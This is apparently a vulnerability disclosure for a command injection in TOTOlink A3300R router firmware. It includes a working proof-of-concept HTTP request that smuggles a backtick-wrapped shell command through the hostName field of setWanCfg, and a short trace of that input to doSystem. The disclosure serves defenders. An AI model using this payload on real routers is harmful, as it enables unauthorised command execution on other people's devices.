# TOTOlink A3300R V17.0.0cu.557_B20221024 Command Injection

## Product Information

Device: TOTOlink A3300R
Firmware Version: V17.0.0cu.557_B20221024
Manufacturer's website information：https://www.totolink.net/
Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/241/ids/36.html

![image-20240109124617070](D:\typora 图片\image-20240109124617070.png)

## Vulnerability Description

When deal with  `setWanCfg` request,`hostName` parameter is vulnerable to OS command injection.

### POC

```
POST /cgi-bin/cstecgi.cgi?token=07A82EFFF70D2D6B HTTP/1.1
Host: itotolink.net
Content-Length: 201
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://itotolink.net
Referer: http://itotolink.net/advance/wan.html?token=07A82EFFF70D2D6B
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

{"hostName":"TOTOLINK`ls>/web/123.txt`","dhcpMtu":"1500","proto":1,"dnsMode":"0","ttlWay":"1","lcpEchoEnable":"1","option60Enable":"0","clone":"0","cloneMac":"40:EE:15:D4:88:6D","topicurl":"setWanCfg"}
```

injection the command "ls>/web/123.txt"

![image-20240109130008597](D:\typora 图片\image-20240109130008597.png)

check the result.

```
GET /123.txt HTTP/1.1
Host: itotolink.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://itotolink.net/advance/upload.html?token=07A82EFFF70D2D6B
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close
```

![image-20240109130149275](D:\typora 图片\image-20240109130149275.png)

## Analysis

sub_422380 will handle the `setWanCfg` request. sub_422380 get `hostName` parameter from request body, then pass to `doSystem` function.

![image-20240109125531671](D:\typora 图片\image-20240109125531671.png)